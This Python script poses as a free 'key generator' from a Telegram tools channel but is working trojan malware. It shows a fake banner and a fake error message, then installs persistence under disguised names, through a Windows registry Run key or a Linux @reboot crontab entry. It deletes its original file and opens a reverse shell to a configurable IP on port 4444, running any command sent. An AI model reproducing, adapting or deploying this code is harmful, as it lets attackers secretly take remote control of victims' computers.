#!/usr/bin/env python3
import os
import sys
import time
import shutil
import socket
import subprocess
import platform


IP_CASA = "127.0.0.1" # PONE TU IP ACA (si lo queres probar en localhost dejalo asi)
PUERTO = 4444         


RED, GREEN, YELLOW, BLUE, CYAN, WHITE, RESET = '\033[31m', '\033[32m', '\033[33m', '\033[34m', '\033[36m', '\033[37m', '\033[0m'

BANNER_SLIDE = rf"""
{CYAN}+=============================================================+
      {BLUE}::::::::  :::         ::::::::::: :::::::::  ::::::::::    
    {BLUE}:+:    :+: :+:            :+:     :+:    :+: :+:            
   {BLUE}+:+        +:+            +:+     +:+    +:+ +:+             
  {BLUE}+#++:++#++ +#+            +#+     +#+    +:+ +#++:++#         
         {BLUE}+#+ +#+            +#+     +#+    +#+ +#+              
{BLUE}#+#    #+# #+#            #+#     #+#    #+# #+#                
{BLUE}########  ########## ########### #########  ##########          
{CYAN}+=============================================================+
{WHITE}| Creador por {BLUE}t.me/Slide_tools {WHITE}| {YELLOW}> {WHITE}Generando llave gratis...
"""

def activar_persistencia():
    sistema = platform.system()
    ruta_actual = os.path.realpath(sys.argv[0])
    
    if sistema == "Windows":

        dir_dest = os.path.join(os.environ["LOCALAPPDATA"], "Microsoft", "Windows")
        destino = os.path.join(dir_dest, "win_sys_updater.exe")
        if ruta_actual.lower() != destino.lower():
            if not os.path.exists(dir_dest): os.makedirs(dir_dest)
            shutil.copy2(ruta_actual, destino)

            cmd = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinUpdater" /t REG_SZ /d "{destino}" /f'
            subprocess.run(cmd, shell=True, capture_output=True)
            return destino
            
    elif sistema == "Linux":

        destino = "/var/tmp/.net_runtime_node"
        if ruta_actual != destino:
            shutil.copy2(ruta_actual, destino)
            os.chmod(destino, 0o755)

            cron_job = f"@reboot python3 {destino} &\n"
            os.system(f'(crontab -l 2>/dev/null; echo "{cron_job}") | crontab -')
            return destino
    return ruta_actual

def listar_estilizado():
    try:
        items = os.listdir('.')
        dirs = [f"\033[38;5;141m[Dir]\033[0m - {i}" for i in items if os.path.isdir(i)]
        arcs = [f"\033[1;37m[Arc]\033[0m - {i}" for i in items if not os.path.isdir(i)]
        return "\n".join(sorted(dirs) + sorted(arcs)).encode()
    except: return b"Error listando archivos."

def shell_loop():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.connect((IP_CASA, PUERTO))
            while True:
                data = s.recv(1024).decode('utf-8', errors='ignore').strip()
                if not data: break
                
                if data == "__GET_CWD__":
                    s.send(os.getcwd().encode())
                elif data.startswith("cd "):
                    try:
                        os.chdir(data[3:].strip())
                        s.send(b" ")
                    except Exception as e:
                        s.send(str(e).encode())
                elif data.lower() in ['ls', 'dir']:
                    s.send(listar_estilizado())
                else:
                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output = proc.stdout.read() + proc.stderr.read()
                    s.send(output if output else b"ejecutado\n")
        except:
            time.sleep(20) 

if __name__ == "__main__":
    ruta_actual = os.path.realpath(sys.argv[0])
    

    if ".net_runtime_node" not in ruta_actual and "win_sys_updater.exe" not in ruta_actual:
        print(BANNER_SLIDE)
        time.sleep(7)
        
        destino_final = activar_persistencia()
        
        print(f"\n{RED}Error creando la llave porfavor contactese con {WHITE}t.me/SlideOwn")
        print(f"{YELLOW}[ - ] Aviso: {WHITE}Para no distribuir herramientas con errores el archivo se borrar automaticamente")
        
        if platform.system() == "Windows":

            subprocess.Popen(f'timeout /t 3 & del "{ruta_actual}"', shell=True)
            subprocess.Popen([destino_final], shell=True, creationflags=0x08000000)
        else:

            subprocess.Popen([sys.executable, destino_final], start_new_session=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.remove(ruta_actual)
        sys.exit()


    shell_loop()
